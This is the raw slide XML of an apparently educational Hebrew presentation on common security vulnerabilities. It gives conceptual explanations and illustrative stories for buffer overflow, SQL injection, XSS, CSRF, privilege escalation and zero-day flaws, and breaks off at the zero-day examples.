        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="334394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F83702AE-70C5-4DEA-821B-D189BAB62A3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2282024"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t>סוגי פרצות אבטחה וניצולן</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42045992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F6CFC0-6EBD-4379-B2F9-8F803CBCAF04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5625548" y="642594"/>
            <a:ext cx="5499652" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מבוא לפרצות אבטחה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6CD70F1-E018-47D6-A710-2E2818097815}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="3780845"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פרצות אבטחה הן נקודות חולשה במערכת מחשוב, רשת, או תוכנה שיכולות להיות מנוצלות על ידי תוקפים כדי לבצע פעולות זדוניות. הפרצות יכולות לנבוע מבעיות בקוד, תצורות לא נכונות, או חולשות אנושיות. נבחן מספר סוגים נפוצים של פרצות אבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סוגי פרצות אבטחה עיקריים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Buffer Overflow .1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection .2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS) .3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Request Forgery (CSRF) .4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Privilege Escalation .5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Zero-Day Vulnerabilities .6</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Man-in-the-Middle (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>MitM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) Attack .7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3602503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DDF689D-F531-40DA-AEA2-F7192677D0FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2097156" y="642594"/>
            <a:ext cx="9028043" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. גלישת חוצץ - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Buffer Overflow</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7C7FFB9-ED6C-4FA1-8F1A-0583F5E2B2C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Buffer Overflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתרחש כאשר תוכנה כותבת יותר נתונים ממה שהחוצץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>buffer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול להכיל. זה גורם לנתונים להישפך לחלקים אחרים בזיכרון, מה שמאפשר לתוקף להחליף את הקוד הזדוני שלו בקוד לגיטימי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תאר לעצמך שאתה עובד בחברה שמפתחת תוכנה לניהול מאגרי מידע. אחד המפתחים כתב פונקציה שלא מגבילה את אורך הקלט של המשתמש. תוקף מגלה את החולשה הזו ושולח קלט ארוך במיוחד שגורם לגלישת חוצץ. התוקף מצליח להחדיר קוד זדוני שמאפשר לו גישה בלתי מורשית לנתונים הרגישים של החברה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פונקציות קלט לא מוגבלות: פונקציות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> gets()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלא מגבילות את אורך הקלט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול: שימוש בקוד הרץ בזיכרון הלא מוגן לביצוע פעולות זדוניות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1841423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A72925-1BA3-4491-9810-15FAA0CBC820}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2951922" y="642594"/>
            <a:ext cx="8173278" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28E30323-C235-4FB7-BDDD-09511BDF186D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחש כאשר תוקף מצליח להחדיר פקודות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוניות לקלט שמשמש ליצירת שאילתות למסד הנתונים. זה מאפשר לתוקף לקרוא, לשנות או למחוק נתונים במסד הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שאתה מנהל אתר מסחר אלקטרוני. באתר יש שדה חיפוש שמאפשר ללקוחות לחפש מוצרים. התוקף מגלה שהקלט מהשדה הזה עובר ישירות לשאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>n SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ללא כל סינון. התוקף מזין קוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני במקום מילות חיפוש, ומצליח לשלוף את כל פרטי הלקוחות שלך ממסד הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קלט לא מסונן: הכנסת קוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני לשדות קלט כמו טפסי חיפוש או כניסה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול: שינוי שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לגשת למידע רגיש או לבצע שינויים במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30807155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3F7F7F-0D9F-4C38-9571-BB775A4CBF61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3210338" y="642594"/>
            <a:ext cx="7914861" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A29BACA5-88FA-4161-9B50-A5F0D193D01D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחש כאשר תוקף מצליח להחדיר קוד זדוני בדרך כלל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאתר שמוצג למשתמשים אחרים. הקוד רץ בדפדפן של המשתמשים ויכול לגנוב נתונים או לבצע פעולות ללא ידיעת המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אתה מנהל פורום אינטרנטי שמאפשר למשתמשים לפרסם הודעות. התוקף מפרסם הודעה שמכילה קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני. כשמשתמשים אחרים קוראים את ההודעה, הקוד רץ בדפדפן שלהם וגונב את קובצי ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלהם, מה שמאפשר לתוקף לגשת לחשבונות שלהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קלט לא מסונן: הכנסת קוד זדוני לשדות קלט שמוצגים למשתמשים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול: גניבת נתוני משתמשים או ביצוע פעולות בשמם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17820282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468D462-EF55-4A83-ADD2-4CEDFC2C6A00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1500808" y="642594"/>
            <a:ext cx="9624391" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Request Forgery (CSRF)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE894C6D-9A7C-400A-851C-E2F5ABA5713F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחש כאשר תוקף משכנע משתמש לבצע פעולה לא רצויה באתר שהוא מחובר אליו, מבלי ידיעת המשתמש. התוקף מנצל את האמינות שהאתר נותן למשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שאתה משתמש באתר בנקאות מקוונת. התוקף שולח לך קישור באימייל או בהודעה שמבצע העברה כספית מחשבונך לחשבונו של התוקף. כאשר אתה לוחץ על הקישור, הפעולה מתבצעת כי אתה כבר מחובר לאתר הבנק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קישורים זדוניים: שליחת קישורים למשתמשים שמבצעים פעולות באתרי אינטרנט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול: ביצוע פעולות ללא ידיעת המשתמש באתר שהוא מחובר אליו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36723230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44E34DD-B7CC-4AA7-AE4D-9C7A494D9E89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="642594"/>
            <a:ext cx="10058400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Privilege Escalation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> (הסלמת הרשאות)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F2D316D-B89F-449F-88D3-68C7E8272F73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Privilege Escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחש כאשר תוקף מצליח להשיג הרשאות גבוהות יותר ממה שהוא אמור לקבל. זה מאפשר לתוקף לבצע פעולות רגישות במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אתה עובד בארגון גדול ומחזיק בהרשאות מוגבלות במערכת. אתה מגלה פרצה שמאפשרת לך לנצל באג בתוכנה ולהפוך למנהל מערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כעת יש לך גישה לכל הנתונים והמשאבים של הארגון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול תצורות שגויות: שימוש בתצורות שגויות במערכת להשגת הרשאות גבוהות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בקוד להשגת הרשאות גבוהות יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9488919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2F28EF-52C0-49C4-87F4-6F5D2A7A2CCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="493643" y="573020"/>
            <a:ext cx="11698357" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) Zero-Day Vulnerabilities </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יום אפס)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F2FE974-1BE3-424E-9E1E-E8756DFEB8E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Zero-Day Vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלא היו ידועות למפתחי התוכנה או למשתמשים עד שהתגלו ונוצלו על ידי תוקפים. בגלל שהפגיעות חדשה, אין עדיין תיקון או עדכון זמין.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תאר לעצמך שאתה מפתח תוכנה פופולרית. התוקף מגלה באג בקוד שלך שמאפשר לו לקבל גישה בלתי מורשית למערכת, לפני שידעת על קיומו של הבאג ויכולת לתקן אותו. בזמן שאתה מתחיל לעבוד על תיקון, התוקף כבר מנצל את הפגיעות לפגיעה במשתמשים שלך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
